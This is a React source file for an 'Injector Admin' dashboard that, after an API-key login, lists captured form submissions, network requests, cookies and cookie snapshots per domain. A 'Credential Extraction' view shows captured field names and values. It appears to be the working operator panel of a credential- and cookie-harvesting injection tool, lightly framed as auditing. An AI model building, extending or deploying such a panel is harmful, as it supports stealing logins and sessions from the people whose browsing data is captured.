import React, { useState, useEffect } from 'react'
import Login from './Login'
import './App.css'

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [token, setToken] = useState('')
  const [activeTab, setActiveTab] = useState('captures')
  const [captures, setCaptures] = useState([])
  const [credentials, setCredentials] = useState([])
  const [loading, setLoading] = useState(false)
  const [stats, setStats] = useState({ total_captures: 0, total_credentials: 0 })
  const [error, setError] = useState(null)
  const [searchTerm, setSearchTerm] = useState('')
  const [typeFilter, setTypeFilter] = useState('ALL')
  const [debouncedSearch, setDebouncedSearch] = useState('')

  // Use relative path for universal support (local & production)
  const API_BASE = '/v1/admin'

  useEffect(() => {
    const savedToken = localStorage.getItem('admin_api_key')
    if (savedToken) {
      setToken(savedToken)
      setIsAuthenticated(true)
    }
  }, [])

  // Debounce search term
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(searchTerm)
    }, 500)
    return () => clearTimeout(timer)
  }, [searchTerm])

  useEffect(() => {
    if (isAuthenticated) {
      fetchData()
    }
  }, [activeTab, isAuthenticated, typeFilter, debouncedSearch])

  const fetchData = async () => {
    setLoading(true)
    setError(null)
    try {
      const endpoint = activeTab === 'captures' ? '/captures' : '/credentials'
      const queryParams = new URLSearchParams({
        capture_type: typeFilter,
        search: debouncedSearch
      })

      const res = await fetch(`${API_BASE}${endpoint}?${queryParams}`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      })

      if (res.status === 401) {
        handleLogout()
        return
      }

      if (!res.ok) {
        throw new Error(`Server returned ${res.status}: ${res.statusText}`)
      }

      const json = await res.json()

      if (activeTab === 'captures') {
        setCaptures(json.data || [])
        setStats(prev => ({ ...prev, total_captures: json.total || 0 }))
      } else {
        setCredentials(json.data || [])
        setStats(prev => ({ ...prev, total_credentials: json.total || 0 }))
      }
    } catch (err) {
      console.error('Fetch error:', err)
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  const handleDelete = async (id) => {
    if (!window.confirm('Delete this capture?')) return
    try {
      const res = await fetch(`${API_BASE}/captures/${id}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` }
      })
      if (res.status === 401) handleLogout()
      else fetchData()
    } catch (err) {
      alert('Delete failed')
    }
  }

  const handleLogin = (key) => {
    setToken(key)
    setIsAuthenticated(true)
  }

  const handleLogout = () => {
    localStorage.removeItem('admin_api_key')
    setToken('')
    setIsAuthenticated(false)
  }

  if (!isAuthenticated) {
    return <Login onLogin={handleLogin} />
  }

  return (
    <div className="layout">
      <aside className="sidebar glass">
        <div className="logo">
          <div className="logo-icon">NI</div>
          <span>Injector Admin</span>
        </div>
        <nav>
          <button
            className={activeTab === 'captures' ? 'active' : ''}
            onClick={() => setActiveTab('captures')}
          >
            Audit Captures
          </button>
          <button
            className={activeTab === 'credentials' ? 'active' : ''}
            onClick={() => setActiveTab('credentials')}
          >
            Extracted Data
          </button>
        </nav>
        <div className="sidebar-stats">
          <div className="stat-item">
            <label>Captures</label>
            <span>{stats.total_captures}</span>
          </div>
          <div className="stat-item">
            <label>Credentials</label>
            <span>{stats.total_credentials}</span>
          </div>
          <button className="logout-btn" onClick={handleLogout}>Disconnect Node</button>
        </div>
      </aside>

      <main className="content">
        <header className="content-header">
          <h1>{activeTab === 'captures' ? 'Audit Logs' : 'Credential Extraction'}</h1>
          <div className="header-actions">
            <button className="refresh-btn" onClick={fetchData}>Refresh</button>
          </div>
        </header>

        <section className="filter-bar glass">
          <div className="search-box">
            <input
              type="text"
              placeholder="Search domain or URL..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <div className="type-filter">
            <select value={typeFilter} onChange={(e) => setTypeFilter(e.target.value)}>
              <option value="ALL">All Events</option>
              <option value="FORM_SUBMIT">Credentials</option>
              <option value="HTTP_REQUEST">Network Requests</option>
              <option value="HEADER_CAPTURE">Passive Cookies</option>
              <option value="G100">Cookie Snapshots</option>
            </select>
          </div>
        </section>

        {error && (
          <div className="error-banner animate-fade">
            ⚠️ <strong>Error:</strong> {error}
          </div>
        )}

        {loading ? (
          <div className="loader">Synchronizing with Node...</div>
        ) : (
          <div className="data-view animate-fade">
            {activeTab === 'captures' ? (
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Time</th>
                    <th>Type</th>
                    <th>Domain</th>
                    <th>URL</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {captures.map(c => (
                    <tr key={c.id}>
                      <td className="dim">{new Date(c.timestamp).toLocaleString()}</td>
                      <td>
                        <span className={`badge ${c.capture_type}`}>{c.capture_type}</span>
                        {c.capture_type === 'G100' && c.metadata?.node_count && (
                          <span className="count-badge">+{c.metadata.node_count} nodes</span>
                        )}
                      </td>
                      <td className="bold">{c.domain}</td>
                      <td className="dim truncate">{c.url}</td>
                      <td>
                        <button className="delete-btn" onClick={() => handleDelete(c.id)}>Delete</button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            ) : (
              <div className="creds-grid">
                {credentials.map(cr => (
                  <div key={cr.id} className="cred-card glass">
                    <div className="cred-header">
                      <span className="cred-domain">{cr.domain}</span>
                      <span className="cred-time">{new Date(cr.timestamp).toLocaleDateString()}</span>
                    </div>
                    <div className="cred-body">
                      <div className="field">
                        <label>{cr.field_name}</label>
                        <div className="value">{cr.field_value}</div>
                      </div>
                    </div>
                    <div className="cred-footer">
                      <span className="cred-type">{cr.capture_type}</span>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  )
}

export default App
